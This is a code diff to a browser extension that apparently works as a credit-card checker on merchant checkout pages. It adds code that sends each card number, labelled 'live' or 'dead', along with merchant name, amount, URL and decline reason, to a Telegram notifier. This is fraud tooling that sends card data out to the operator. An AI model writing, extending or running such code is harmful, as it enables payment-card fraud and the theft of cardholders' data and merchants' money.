@@ -494,6 +494,17 @@
                 liveCards.push({ card: cardStr, timestamp: Date.now(), url: window.location.href });
                 chrome.storage.local.set({ liveCards });
             });
+            
+            // Send Telegram notification for live card
+            if (typeof window.TelegramNotifier !== 'undefined' && currentCard) {
+                const checkoutInfo = {
+                    merchantName: document.title || 'Unknown',
+                    amount: currentSession?.amount || 'N/A',
+                    currency: currentSession?.currency || '',
+                    url: window.location.href
+                };
+                window.TelegramNotifier.sendHitNotification(currentCard, checkoutInfo);
+            }
         }
 
         // Check for decline - comprehensive patterns
@@ -528,6 +539,11 @@
                 deadCards.push({ card: cardStr, reason: declineReason, timestamp: Date.now() });
                 chrome.storage.local.set({ deadCards });
             });
+            
+            // Send Telegram notification for declined card
+            if (typeof window.TelegramNotifier !== 'undefined' && currentCard) {
+                window.TelegramNotifier.sendDeclineNotification(currentCard, declineReason);
+            }
         }
 
         // Check for 3DS
